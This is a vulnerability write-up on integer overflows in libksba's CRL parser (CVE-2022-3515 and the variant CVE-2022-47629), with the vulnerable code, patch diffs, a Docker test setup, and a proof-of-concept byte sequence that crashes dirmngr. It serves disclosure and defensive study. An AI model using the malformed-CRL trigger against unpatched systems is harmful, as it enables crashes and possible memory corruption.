<!-- vim-markdown-toc GFM -->

* [Overview](#overview)
* [The Original Bug (CVE-2022-3515)](#the-original-bug-cve-2022-3515)
* [Proof of Concept](#proof-of-concept)
* [The Patch](#the-patch)
* [The Variant Bug (CVE-2022-47629)](#the-variant-bug-cve-2022-47629)
* [References](#references)

<!-- vim-markdown-toc -->

# Introduction

This write-up describes variant analysis of CVE-2022-3515 affecting libksba, which resulted in CVE-2022-47629. 

For a Docker testing environment, see [CVE-2022-47629/](./CVE-2022-47629/).

# Overview

[Libksba](https://gnupg.org/software/libksba/) is a library used for working with X.509 certificates, Cryptographic Message Syntax (CMS) data, etc. It is a dependency of the GnuPG software gpgsm and dirmngr.

> Libksba is a library to make the tasks of working with X.509 certificates, CMS data and related objects more easy. It provides a highlevel interface to the implemented protocols and presents the data in a consistent way. There is no more need to worry about all the nasty details of the protocols. The API gives the C programmer an easy way of interacting with the data. It copes with the version details X.509 protocols tend to have as well as with the many different versions and dialects. Applications must usually cope with all of this and it has to be coded over and over again. Libksba hides this by providing just one API which does the Right Thingâ„¢. Support for new features will be added as needed. 

An integer overflow bug (CVE-2022-3515) was reported on 2022-10-04, fixed on 2022-10-05 and advisories published on 2022-10-17. On 2022-11-22, we reported a variant bug (CVE-2022-47629) which was fixed the next day. A general publication by the GnuPG maintainers was made on 2022-12-20.

# The Original Bug (CVE-2022-3515)

The [blog post](https://gnupg.org/blog/20221017-pepe-left-the-ksba.html) by GnuPG explains the bug well. In essence, the bug is an integer overflow that allows an important (write size) check to be bypassed, leading to a buffer overflow.

We begin by taking a look at a helper function that Libksba uses for parsing [ASN.1](https://en.wikipedia.org/wiki/Abstract_Syntax_Notation_One) objects. The data the library works with is typically encoded with [BER](https://en.wikipedia.org/wiki/X.690#BER_encoding) which is a kind of [type-length-value](https://en.wikipedia.org/wiki/Type%E2%80%93length%E2%80%93value) encoding scheme. In Liksba, this TLV object is represented as a struct:

```C
struct tag_info {
  enum tag_class class;
  int is_constructed;
  unsigned long tag;
  unsigned long length;  /* length part of the TLV */
  int ndef;              /* It is an indefinite length */
  size_t nhdr;           /* number of bytes in the TL */
  unsigned char buf[10]; /* buffer for the TL */
  const char *err_string;
  int non_der;
};
```

The [`_ksba_ber_read_tl`](https://git.gnupg.org/cgi-bin/gitweb.cgi?p=libksba.git;a=blob;f=src/ber-help.c;h=81c31ed78df2cf4e07d180f2f29194ee33ddc8f4;hb=e11e17620189e13b7347139ed5a1f1a76b1f89a7#l93) function is responsible for reading some bytes and populating the fields of this struct:

```C
/*
   Read the tag and the length part from the TLV triplet.
 */
gpg_error_t
_ksba_ber_read_tl (ksba_reader_t reader, struct tag_info *ti)
{
  int c;
  unsigned long tag;

  ti->length = 0;
  ti->ndef = 0;
  ti->nhdr = 0;
  ti->err_string = NULL;
  ti->non_der = 0;

  /* Get the tag */
  c = read_byte (reader);
  if (c==-1)
    return eof_or_error (reader, ti, 0);

  ti->buf[ti->nhdr++] = c;
  ti->class = (c & 0xc0) >> 6;
  ti->is_constructed = !!(c & 0x20);
  tag = c & 0x1f;

  if (tag == 0x1f)
    {
      tag = 0;
      do
        {
          /* We silently ignore an overflow in the tag value.  It is
             not worth checking for it. */
          tag <<= 7;
          c = read_byte (reader);
          if (c == -1)
            return eof_or_error (reader, ti, 1);
          if (ti->nhdr >= DIM (ti->buf))
            {
              ti->err_string = "tag+length header too large";
              return gpg_error (GPG_ERR_BAD_BER);
            }
          ti->buf[ti->nhdr++] = c;
          tag |= c & 0x7f;
        }
      while (c & 0x80);
    }
  ti->tag = tag;

  /* Get the length */
  c = read_byte (reader);
  if (c == -1)
    return eof_or_error (reader, ti, 1);
  if (ti->nhdr >= DIM (ti->buf))
    {
      ti->err_string = "tag+length header too large";
      return gpg_error (GPG_ERR_BAD_BER);
    }
  ti->buf[ti->nhdr++] = c;

  if ( !(c & 0x80) )
    ti->length = c;
  else if (c == 0x80)
    {
      ti->ndef = 1;
      ti->non_der = 1;
    }
  else if (c == 0xff)
    {
      ti->err_string = "forbidden length value";
      return gpg_error (GPG_ERR_BAD_BER);
    }
  else
    {
      unsigned long len = 0;
      int count = c & 0x7f;

      if (count > sizeof (len) || count > sizeof (size_t))
        return gpg_error (GPG_ERR_BAD_BER);

      for (; count; count--)
        {
          len <<= 8;
          c = read_byte (reader);
          if (c == -1)
            return eof_or_error (reader, ti, 1);
          if (ti->nhdr >= DIM (ti->buf))
            {
              ti->err_string = "tag+length header too large";
              return gpg_error (GPG_ERR_BAD_BER);
            }
          ti->buf[ti->nhdr++] = c;
          len |= c & 0xff;
        }
      ti->length = len;
    }

  /* Without this kludge some example certs can't be parsed */
  if (ti->class == CLASS_UNIVERSAL && !ti->tag)
    ti->length = 0;

  return 0;
}
```

As we can see, the function implements a decoder for the type and length components of BER encoded data. The first byte is responsible for setting the `class`, `is_constructed` and `tag` fields (unless the lower five bits are all 1, in which case the tag is read from the following bytes). The rest of the bytes simply encode the announced length of the value. There are four possible cases, depending on the value of the first byte:

1. If the most significant bit of the first byte is a `0`, then the form of the length octets is definite and short. In this case, the length is set to be the value of the first byte itself.
2. If the first byte is a `0x80`, then the form of the length octets is indefinite. This is used for arbitrary or unknown lengths of data. In this case, "End-of-Contents" octets are required to indicate the end of the value data.
3. If the most significant bit of the first byte is a `1` and the remaining 7 bits are not all `0` nor all `1`, then the form of the length octets is definite and long and the remaining 7 bits indicate the number of following octets that contain the length. As an example, if the length octets are `82abcd`, then the length will be `0xabcd`.
4. If the first byte is a `0xff`, an error is returned.

Though the bug doesn't occur in this function, it's interesting to keep in mind because it seems like the `length` value can be controlled quite freely.

The original bug was reported to affect the CRL and CMS parsers in the library. There were three vulnerable points identified:

- [Stack buffer overflow in CMS data parsing](https://www.zerodayinitiative.com/advisories/ZDI-22-1463/)
- [Heap buffer overflow in CMS data parsing](https://www.zerodayinitiative.com/advisories/ZDI-22-1464/)
- [Stack buffer overflow in CRL data parsing](https://www.zerodayinitiative.com/advisories/ZDI-22-1465/)

In this writeup, we'll focus on the parsing of CRL data. The typical usage of Liksba for parsing CRL data is to call the [`ksba_crl_parse(ksba_crl_t crl, ksba_stop_reason_t *r_stopreason)`](https://git.gnupg.org/cgi-bin/gitweb.cgi?p=libksba.git;a=blob;f=src/crl.c;h=9f71c851337126d087b259df35f3f3bb6aaab61f;hb=e11e17620189e13b7347139ed5a1f1a76b1f89a7#l1368) function in a loop, and do further processing or stop processing based on the `r_stopreason` which is set by the function.

Upon calling this parse function for the first time with `r_stopreason = 0`, the [`parse_to_next_update(ksba_crl_t crl)`](https://git.gnupg.org/cgi-bin/gitweb.cgi?p=libksba.git;a=blob;f=src/crl.c;h=9f71c851337126d087b259df35f3f3bb6aaab61f;hb=e11e17620189e13b7347139ed5a1f1a76b1f89a7#l777) will be called to parse the fixed block at the beginning of the CRL data. Looking at this function, we see that it declares an array on the stack and then later reads into it:

```C
static gpg_error_t
parse_to_next_update (ksba_crl_t crl)
{
  gpg_error_t err;
  struct tag_info ti;
  unsigned long outer_len, tbs_len;
  int outer_ndef, tbs_ndef;
  int c;
  unsigned char tmpbuf[500]; /* for OID or algorithmIdentifier */
  size_t nread;

  [...]

  err = _ksba_ber_read_tl (crl->reader, &ti);
  if (err)
    return err;

  [...]

  if (ti.nhdr + ti.length >= DIM(tmpbuf))
    return gpg_error (GPG_ERR_TOO_LARGE);
  memcpy (tmpbuf, ti.buf, ti.nhdr);
  err = read_buffer (crl->reader, tmpbuf+ti.nhdr, ti.length);
  if (err)
    return err;
```

The tag and length bytes are copied into the buffer, followed by reading the contents into it. As we noted before, `ti.length` here is more or less under our control, and we can expect `ti.nhdr` to be a small value (less than 10). The check

```C
  if (ti.nhdr + ti.length >= DIM(tmpbuf))
    return gpg_error (GPG_ERR_TOO_LARGE);
```

is clearly intended to prevent overflowing the stack buffer. However, if we choose `ti.length` to be very large (i.e. close to the largest value it could possibly be as a 64 bit unsigned integer), then an integer overflow will occur when summing the `ti.nhdr` and `ti.length` values making the result small and therefore passing the check. Meanwhile, the value of `ti.length` itself is still large, and so the call to [`read_buffer`](https://git.gnupg.org/cgi-bin/gitweb.cgi?p=libksba.git;a=blob;f=src/crl.c;h=9f71c851337126d087b259df35f3f3bb6aaab61f;hb=e11e17620189e13b7347139ed5a1f1a76b1f89a7#l616) will read a large number of (controlled) bytes into the stack buffer.

# Proof of Concept

The `parse_to_next_update` function makes two calls to `_ksba_ber_read_tl` before the call which leads to the vulnerability. So to trigger the bug, our CRL data should begin with two TLV encoded blocks (which also satisfy all the checks and constraints to avoid errors). Static or dynamic analysis is useful here and we find that the block `3080` works well for both blocks. For the third block which leads to the vulnerability, we want to specify the length of the content, so the block `3088ffffffffffffffff` will work to set the length to `0xffffffffffffffff`. Following this, we simply append the data we want written into the stack buffer. Writing a large amount of data (more than 638 bytes) is sufficient to overwrite the stack canary or return address and cause a crash.

To test this, the following Dockerfile can be used:

```Dockerfile
FROM ubuntu:20.04

ARG DEBIAN_FRONTEND=noninteractive

RUN mkdir /libksba-bug
WORKDIR /libksba-bug

RUN apt update && apt install -y gdb git build-essential autoconf automake bison libgpg-error-dev texinfo
RUN git clone https://dev.gnupg.org/source/libksba.git \
    && cd libksba && git checkout e11e176 && ./autogen.sh  && ./configure && make; exit 0
RUN cp /libksba-bug/libksba/src/.libs/libksba.so.8.* /usr/lib/x86_64-linux-gnu/libksba.so.8

ENTRYPOINT ["/bin/bash"]
```

The image can be built by running (in the directory containing the `Dockerfile`)

```
docker build -t libksba-bug .
```

and the container can be launched by running

```
docker run -it libksba-bug
```

In the container, we can trigger the bug (using `dirmngr` as the target) by running

```
dirmngr --load-crl vuln.crl
```

where `vuln.crl` is the malicious CRL file.

```
root@4bf4e176319d:/libksba-bug# dirmngr --load-crl vuln.crl
dirmngr[15]: No ldapserver file at: '/root/.gnupg/dirmngr_ldapservers.conf'
dirmngr[15.0]: permanently loaded certificates: 128
dirmngr[15.0]:     runtime cached certificates: 0
dirmngr[15.0]:            trusted certificates: 128 (127,0,0,1)
dirmngr[15.0]: failed to open cache dir file '/root/.gnupg/crls.d/DIR.txt': No such file or directory
dirmngr[15.0]: creating directory '/root/.gnupg'
dirmngr[15.0]: creating directory '/root/.gnupg/crls.d'
dirmngr[15.0]: new cache dir file '/root/.gnupg/crls.d/DIR.txt' created
*** stack smashing detected ***: terminated
Aborted (core dumped)
```

Of course, thanks to protections like stack canaries, this bug alone is not sufficient to hijack control flow.

# The Patch

The maintainers of the library promptly patched this bug by adding an additional check to the `_ksba_ber_read_tl` function, hoping to fix the issue at its source. The [patch diff](https://git.gnupg.org/cgi-bin/gitweb.cgi?p=libksba.git;a=blobdiff;f=src/ber-help.c;h=56efb6a3bec245e802e2e9e1c5f5988ca582c887;hp=81c31ed78df2cf4e07d180f2f29194ee33ddc8f4;hb=4b7d9cd4a018898d7714ce06f3faf2626c14582b;hpb=e11e17620189e13b7347139ed5a1f1a76b1f89a7) is shown below:

```diff
--- a/src/ber-help.c
+++ b/src/ber-help.c
@@ -182,6 +182,12 @@ _ksba_ber_read_tl (ksba_reader_t reader, struct tag_info *ti)
       ti->length = len;
     }
 
+  if (ti->length > ti->nhdr && (ti->nhdr + ti->length) < ti->length)
+    {
+      ti->err_string = "header+length would overflow";
+      return gpg_error (GPG_ERR_EOVERFLOW);
+    }
+
   /* Without this kludge some example certs can't be parsed */
   if (ti->class == CLASS_UNIVERSAL && !ti->tag)
     ti->length = 0;
```

The check ensures that the sum of the header length and the announced length cannot overflow. While this is sufficient to fix the instances of integer overflow that were identified, it fails to account for the possibility of a write size check that involves adding another variable to the `header+length`...

# The Variant Bug (CVE-2022-47629)

A variant of the original bug was discovered that also occurs during parsing of CRL data. It occurs in the [`parse_signature`](https://git.gnupg.org/cgi-bin/gitweb.cgi?p=libksba.git;a=blob;f=src/crl.c;h=9f71c851337126d087b259df35f3f3bb6aaab61f;hb=ff8c0e857c2f3380a13be19c67b117337ed0ffb6#l1320) function that is called at the end of parsing all items and extensions:

```C
/* Parse the signatureAlgorithm and the signature */
static gpg_error_t
parse_signature (ksba_crl_t crl)
{
  gpg_error_t err;
  struct tag_info ti = crl->state.ti;
  unsigned char tmpbuf[2048]; /* for the sig algo and bitstr */
  size_t n, n2;

  [...]

  n = ti.nhdr + ti.length;

  [...]

  /* and append the bit string */
  err = _ksba_ber_read_tl (crl->reader, &ti);
  if (err)
    return err;
  if ( !(ti.class == CLASS_UNIVERSAL && ti.tag == TYPE_BIT_STRING
         && !ti.is_constructed) )
    return gpg_error (GPG_ERR_INV_CRL_OBJ);
  n2 = ti.nhdr + ti.length;
  if (n + n2 >= DIM(tmpbuf))
    return gpg_error (GPG_ERR_TOO_LARGE);
  memcpy (tmpbuf+n, ti.buf, ti.nhdr);
  err = read_buffer (crl->reader, tmpbuf+n+ti.nhdr, ti.length);
  if (err)
    return err;
```

In this case, the contents of two TLV blocks are written to a stack buffer. To prevent an overflow, there is a check to ensure that `n + n2` does not exceed the size of the buffer. Although `n` and `n2` cannot be overflowed individually because of the patch from CVE-2022-3515, summing them may cause an overflow, allowing the write size check to be bypassed. Following the check, `ti.length` (which may be a large value) bytes are read into the stack buffer which results in the buffer overflow.

## Discovered
* November 2022, Joseph Surin, elttam

# References

- **GnuPG security advisory:** https://gnupg.org/blog/20221017-pepe-left-the-ksba.html
- **Patch for CVE-2022-3515**
    - https://dev.gnupg.org/T6230
    - [Commit diff](https://git.gnupg.org/cgi-bin/gitweb.cgi?p=libksba.git;a=blobdiff;f=src/ber-help.c;h=56efb6a3bec245e802e2e9e1c5f5988ca582c887;hp=81c31ed78df2cf4e07d180f2f29194ee33ddc8f4;hb=4b7d9cd4a018898d7714ce06f3faf2626c14582b;hpb=e11e17620189e13b7347139ed5a1f1a76b1f89a7)
- **Patch for CVE-2022-47629**
  - https://dev.gnupg.org/T6284
  - [Commit diff](https://git.gnupg.org/cgi-bin/gitweb.cgi?p=libksba.git;a=commit;h=f61a5ea4e0f6a80fd4b28ef0174bee77793cf070)
